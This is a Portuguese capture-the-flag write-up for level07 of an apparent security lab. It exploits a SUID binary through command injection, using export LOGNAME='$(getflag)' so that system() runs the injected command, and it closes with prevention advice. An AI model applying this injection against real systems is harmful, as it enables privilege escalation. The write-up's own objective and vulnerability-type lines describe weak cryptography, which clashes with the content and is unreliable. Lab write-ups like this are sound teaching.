# 𝕃𝕖𝕧𝕖𝕝 𝟘𝟟

## 🎯 Objetivo
O objetivo deste nível é recuperar a senha original descriptografando um arquivo de texto que foi ofuscado por um algoritmo de substituição customizado em um binário.

## 🔍 Análise da Vulnerabilidade

* **Tipo:** *Custom/Weak Cryptography* (Criptografia Fraca/Customizada) e *Reverse Engineering* (Engenharia Reversa).
* **Arquivo Alvo:** `level07` (Executável SUID em C).
* **Comportamento:** Através de engenharia reversa dinâmica usando `ltrace`, observamos o comportamento interno do binário. O programa faz uma chamada para `getenv("LOGNAME")` para capturar o nome do usuário logado no sistema e, em seguida, formata essa string (usando `asprintf`) para jogá-la dentro de uma função `system()`.

    O comando final executado pelo programa por debaixo dos panos é algo como:
    `system("/bin/echo $LOGNAME")`

    Como nós (usuários) temos controle total sobre as nossas próprias variáveis de ambiente antes de executar o programa, podemos alterar o valor de `LOGNAME` para conter um comando malicioso. Quando o `system()` rodar, o shell interpretará e executará a nossa injeção.

## 💻 Passos para Exploração (Exploit)

1.  **Reconhecimento:**
    Listamos os arquivos e identificamos o executável SUID alvo.
    ```bash
    ls -al
    # -rwsr-sr-x 1 flag07 level07 8805 Mar  5  2016 level07
    ```

2.  **Identificação do Arquivo:**
    ```bash
    file level07
    # level07: setuid setgid ELF 32-bit LSB executable...
    ```

3.  **Análise Dinâmica (Rastreamento de Funções):**
    Utilizamos o `ltrace` para ver quais funções da biblioteca C o programa estava chamando.
    ```bash
    ltrace ./level07
    # Saída revela as chamadas críticas:
    # getenv("LOGNAME")
    # asprintf(...)
    # system("/bin/echo ...")
    ```
    > A saída do `ltrace` confirmou que o binário pega a variável `LOGNAME` e a passa para o `system()`.

4.  **Preparação e Execução do Exploit:**
    Alteramos o valor da variável de ambiente `LOGNAME` na nossa sessão atual. Injetamos uma subshell `$(getflag)`, usando aspas simples para garantir que o nosso próprio terminal não executasse o comando antecipadamente. Em seguida, executamos o binário vulnerável.
    ```bash
    export LOGNAME='$(getflag)'
    ./level07
    # Saída: Check flag.Here is your token : fiumuita...
    ```
    > O binário rodou `system("/bin/echo $(getflag)")`. O shell do sistema resolveu o `$(getflag)` com os privilégios do SUID (flag07) antes que o `echo` pudesse imprimir.

## 🚩 Solução / Flag
A injeção de comando através da variável de ambiente foi executada com sucesso, imprimindo a flag.

## 🛡️ Prevenção (Como corrigir)
1. **Não confie no Ambiente**: Variáveis de ambiente (`getenv`) são inputs controlados pelo usuário. Elas nunca devem ser passadas diretamente para funções de execução, formatação ou acesso a arquivos sem uma sanitização rigorosa.

2. **Evite a família system()**: Em C, o uso da função `system()` é desencorajado porque ela invoca um shell (`/bin/sh`) que pode ser facilmente manipulado. Se for estritamente necessário executar um comando do sistema, prefira as funções da família `exec()` (como `execve`), passando os argumentos de forma estruturada e não como uma string concatenada.
